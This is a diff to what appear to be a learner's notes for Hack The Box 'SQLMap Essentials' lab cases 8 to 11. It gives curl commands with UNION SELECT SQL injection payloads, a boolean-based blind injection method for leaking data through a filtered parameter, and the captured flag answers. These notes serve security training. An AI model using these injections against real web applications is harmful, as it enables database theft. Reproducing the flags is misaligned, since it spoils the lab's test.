@@ -201,3 +201,15 @@ ANSWER flag8: HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}
   U=$(shuf -i 100000000-999999999 -n1)
   curl ".../case9.php?id=0 union select 1,2,3,4,5,(select content from flag9)&uid=$U"
 ANSWER flag9: HTB{700_much_r4nd0mn355_f0r_my_74573}
+
+---
+# SQLMap Essentials - Cases 10 & 11 (target 154.57.164.79:40261)
+
+## Case 10 - Primitive protection (POST id, 9 cols, UNION works)
+curl -X POST ".../case10.php" --data-urlencode 'id=0 union select 1,2,3,4,5,6,7,8,(select content from flag10)'
+ANSWER flag10: HTB{y37_4n07h3r_r4nd0m1z3}
+
+## Case 11 - Filtering of '<' and '>' (GET id, UNQUOTED, boolean-based)
+TRUE/FALSE: id=1 AND 1=1 (1 row) / id=1 AND 1=2 (0 rows)
+Leak: id=1 AND (select content from flag11)=0x<hex>  -> 1 row (true)
+ANSWER flag11: HTB{5p3c14l_ch4r5_n0_m0r3}
